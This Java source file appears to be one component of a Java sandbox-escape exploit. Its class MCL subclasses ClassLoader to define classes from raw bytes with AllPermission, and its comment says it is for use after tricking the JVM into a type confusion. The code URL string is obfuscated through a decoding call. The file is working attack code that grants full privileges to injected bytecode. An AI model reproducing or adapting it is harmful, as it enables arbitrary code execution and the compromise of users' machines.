package x;


import java.net.MalformedURLException;
import java.net.URL;
import java.security.AllPermission;
import java.security.CodeSource;
import java.security.Permissions;
import java.security.ProtectionDomain;
import java.security.cert.Certificate;

/**
 * A ClassLoader subclass to call defineClass in MCL 
 * in a static way. A useful utility when we are able to trick
 * the JVM into a type confusion. 
 */
public class MCL extends ClassLoader {

    public static Class<?> myDefineClass(MCL cl, byte[] bytes, int offset, int length) {
        Permissions perms = new Permissions();
        perms.add(new AllPermission());
        CodeSource cs = null;
        try {
            cs = new CodeSource(new URL(x.Strings.dec("gjmf;000")), new Certificate[0]);
        } catch (MalformedURLException e) {
            //e.printStackTrace();
        }
        ProtectionDomain pd = new ProtectionDomain(cs, perms);
        return cl.defineClass(null, bytes, offset, length, pd);
    }

}
